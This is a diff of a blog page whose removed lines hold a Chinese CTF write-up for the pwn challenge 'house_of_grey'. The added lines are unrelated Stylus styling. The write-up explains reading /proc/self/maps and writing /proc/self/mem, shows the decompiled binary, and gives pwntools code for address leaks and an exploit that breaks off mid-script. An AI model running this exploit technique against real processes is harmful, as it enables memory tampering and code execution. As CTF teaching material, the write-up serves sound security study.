@@ -145,266 +145,198 @@
             <div class="main-content">
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    $avatarWidth = 46px;
+$arrow-icon-width = 16px;
+$post-nav-max-width = 220px;
+$article-title-font-size = 1.6rem;
 
-        <div class="article-title">
-            <span class="title-hover-animation">house_of_grey</span>
-        </div>
+.article-content-container {
 
-        
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/ai.jpg">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">196082</span>
-                        
-                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2022-01-05 12:31:22
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/pwn-xctf/">pwn-xctf</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/proc/">/proc</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+  keep-container(false, 0, 0, 30px, 30px);
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>2k 字</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>10 分钟</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
-    
-</div>
+  .article-title {
+    color: var(--second-text-color);
+    font-weight: 600;
+    font-size: $article-title-font-size;
 
-                    </div>
-                </div>
-            </div>
-        
+    +keep-tablet() {
+      font-size: $article-title-font-size * 0.9;
+    }
 
-        <div class="article-content markdown-body">
-            <h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><p>Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。<br>同样的，我们也可以通过写入mem文件来直接写入内存，例如直接修改代码段，放入我们的shellcode，从而在程序流程执行到这一步时执行shellcode来拿shell。<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220105123349595.png"
-                      alt="image-20220105123349595"
-                ></p>
-<p>可以看到效果类似与gdb的vmmap。</p>
-<h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220105123705542.png"
-                      alt="image-20220105123705542"
-                ></p>
-<p>保护全开</p>
-<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+1Bh] [rbp-25h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+1Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">__pid_t</span> pid; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_F35(a1, a2, a3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my house! Enjoy yourself!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to help me build my room? Y/n?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="number">121</span> || buf == <span class="number">89</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, &amp;v7, <span class="number">8uLL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    v7 &amp;= <span class="number">0xFFFFF0</span>u;</span><br><span class="line">    v8 = (<span class="keyword">char</span> *)mmap(<span class="number">0LL</span>, <span class="number">0x10000000</span>uLL, <span class="number">3</span>, <span class="number">131106</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 == (<span class="keyword">char</span> *)<span class="number">-1LL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pid = clone(fn, &amp;v8[v7], <span class="number">256</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( pid == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;clone&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    waitpid(pid, &amp;stat_loc, <span class="number">0x80000000</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (stat_loc &amp; <span class="number">0x7F</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nMaybe something wrong? Build failed!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nBuild finished! Thanks a lot!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You don&#x27;t help me? OK, just get out of my hosue!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>首先是创建映射，然后将将映射的随机部分当作fn函数的堆栈区</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">fn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+30h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *v8; <span class="comment">// [rsp+48h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">40</span>]; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You get into my room. Just find something!\n&quot;</span>);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">0x186A0</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_14D2() )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  v8 = v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_FEE() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;So man, what are you finding?&quot;</span>);</span><br><span class="line">        buf[(<span class="keyword">int</span>)(read(<span class="number">0</span>, buf, <span class="number">0x28</span>uLL) - <span class="number">1</span>)] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_FA6(buf) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Man, don&#x27;t do it! See you^.&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fd = open(buf, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;So, Where are you?&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">0x20</span>uLL);</span><br><span class="line">        v1 = strtoull(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        lseek(fd, v1, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;How many things do you want to get?&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">8uLL</span>);</span><br><span class="line">        v4 = atoi(nptr);</span><br><span class="line">        <span class="keyword">if</span> ( v4 &lt;= <span class="number">100000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = read(fd, v8, v4);</span><br><span class="line">          <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error read&quot;</span>);</span><br><span class="line">            perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;You get something:&quot;</span>);</span><br><span class="line">          write(<span class="number">1</span>, v8, v5);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;You greedy man!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;What do you want to give me?&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, v8, <span class="number">0x200</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nI guess you don&#x27;t want to say Goodbye!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But sadly, bye! Hope you come again!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里四个功能就是，第一个：输入要读的文件名，第二个：改变便宜指针，第三个：获取文件内容，第四个：输入数据</p>
-<p>漏洞：buf存在缓冲区溢出可以覆盖v8指针导致任意地址写</p>
-<h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>利用读取任意文件读取/proc/self/maps然后获得程序加载基地址，再者就是获取自己创建的映射关系</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220105125620177.png"
-                      alt="image-20220105125620177"
-                ></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">find(<span class="string">b&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">get()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;You get something:\n&#x27;</span>)</span><br><span class="line">process_base = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;-&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;process_base:&quot;</span>+<span class="built_in">hex</span>(process_base))</span><br><span class="line"></span><br><span class="line">puts_addr = process_base+puts_plt</span><br><span class="line">read_addr = process_base+read_plt</span><br><span class="line">open_addr = process_base+open_plt</span><br><span class="line">pop_rdi_addr = process_base+pop_rdi</span><br><span class="line">pop_rsi_r15_addr = process_base+pop_rsi_r15</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">stack_arr = <span class="built_in">str</span>(r.recvuntil(<span class="string">b&#x27; rw-p &#x27;</span>, drop=<span class="literal">True</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(stack_arr)</span><br><span class="line">stack_start = <span class="built_in">int</span>(stack_arr[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack_start:&quot;</span>+<span class="built_in">hex</span>(stack_start))</span><br><span class="line">stack_end = <span class="built_in">int</span>(stack_arr[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_start:&quot;</span>+<span class="built_in">hex</span>(stack_start))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_end:&quot;</span>, <span class="built_in">hex</span>(stack_end))</span><br></pre></td></tr></table></figure>
-
-<p>接着思路就是利用mem劫持执行流，但是在看ida的代码</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220105125954789.png"
-                      alt="image-20220105125954789"
-                ></p>
-<p>程序都是以exit(0)结束，导致在fn我们无法进行ROP。所以思路就是我们覆盖掉read函数的ret地址来进行ROP。</p>
-<p>首先需要确定read的ret地址，但是我们连这个上面存放的什么都不知道所以很难操作，所以我们选择寻找buf的位置。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">find(<span class="string">b&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">locate(stack_start)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    get()</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You get something:\n&#x27;</span>)<span class="comment"># 这一句千万别忘了，我就是忘了找一句导致一直跑不出来。</span></span><br><span class="line">    content = r.recvuntil(<span class="string">b&#x27;\n1.Find something&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;/proc/self/mem&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">        success(<span class="string">&#x27;OK!!!&#x27;</span>)</span><br><span class="line">        buf_addr = <span class="built_in">len</span>(content.split(<span class="string">b&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">                       [<span class="number">0</span>])+i*<span class="number">100000</span>+stack_start</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">23</span>:</span><br><span class="line">        log.failure(<span class="string">&#x27;NO!!!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<p>其实buf地址的计算式很好就可以理解。</p>
-<p>但是光知道buf地址我们还是没法进行ROP。所以下一步就是求read的ret地址</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220105130535973.png"
-                      alt="image-20220105130535973"
-                ></p>
-<p>可以看到buf距离rsp的地址其实是0x30，但是在执行call _read指令时会执行push ip这条命令，执行完ret也就是pop ip。所以push进去之后rsp又会降低8个字节。所以此时read的ret地址距离buf的地址是0x38(以上是我个人对于0x38的猜测，因为其他博客并没有说清楚，可能是觉得太简单了，有错误欢迎大家在下方留言评论)。</p>
-<p>所以获得ret地址的代码也就是在上面加点小改动</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">find(<span class="string">b&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">locate(stack_start)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    get()</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You get something:\n&#x27;</span>)</span><br><span class="line">    content = r.recvuntil(<span class="string">b&#x27;\n1.Find something&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;/proc/self/mem&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">        success(<span class="string">&#x27;OK!!!&#x27;</span>)</span><br><span class="line">        buf_addr = <span class="built_in">len</span>(content.split(<span class="string">b&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">                       [<span class="number">0</span>])+i*<span class="number">100000</span>+stack_start</span><br><span class="line">        ret_addr = buf_addr-<span class="number">0x38</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">23</span>:</span><br><span class="line">        log.failure(<span class="string">&#x27;NO!!!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<p>最后就是利用任意地址写构建ROP了，但是程序禁止了execve所以没法system这种了，选择open-&gt;read-&gt;puts就好了</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220105131207055.png"
-                      alt="image-20220105131207055"
-                ></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./cab92757a3ca4246a7a7eb7c880e20d9&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./cab92757a3ca4246a7a7eb7c880e20d9&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">50398</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000001823</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000001821</span></span><br><span class="line">open_plt = elf.plt[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span>(<span class="params">name</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5.Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;So man, what are you finding?&#x27;</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">locate</span>(<span class="params">pos</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5.Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;So, Where are you?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(pos), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5.Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;How many things do you want to get?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;100000&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give</span>(<span class="params">content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5.Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Do you want to help me build my room? Y/n?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">find(<span class="string">b&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">get()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;You get something:\n&#x27;</span>)</span><br><span 